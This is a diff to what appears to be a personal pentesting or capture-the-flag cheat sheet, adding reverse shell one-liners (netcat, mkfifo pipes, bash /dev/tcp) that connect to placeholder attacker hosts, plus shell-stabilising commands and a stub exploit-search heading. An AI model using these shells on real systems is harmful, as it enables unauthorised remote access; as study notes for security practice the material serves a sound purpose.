@@ -14,6 +14,7 @@
     - [Finding Important Files](#finding-important-files)
 - [Uploading Files](#uploading-files)
   - [DNS, SMB, SNMP](#dns-smb-snmp)
+- [Searchexploit](#searchexploit)
 
 
 # Linux
@@ -78,12 +79,18 @@
 - Reverse:
   - target: 
     - nc <LOCAL-IP> <PORT> -e /bin/bash
+    - nc DEST_IP DEST_PORT -c "/bin/bash 2>&1"
+    - nc DEST_IP DEST_PORT | /bin/bash 2>&1 | nc DEST_IP DEST_PORT+1
     - mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
-    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f”
+    - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f”
+    - No NC:
+      - bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
+      - bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
   - Ziel: nc -nlvp PORT
 
 ## Stabilizing
 -  python3 -c 'import pty;pty.spawn("/bin/bash")' = better view
+-  python -c "import pty;pty.spawn('/bin/bash')"
 -  export TERM=xterm = commands like clear
 -  ctr + z = back to our shel
 -  stty raw -echo; fg = back to reverse shell
@@ -186,3 +193,5 @@
   - snmpcheck
   - /opt/snmpcheck/snmpcheck.rb 10.10.84.238 -c COMMUNITY_STRING.
 
+# Searchexploit
+- m = copie
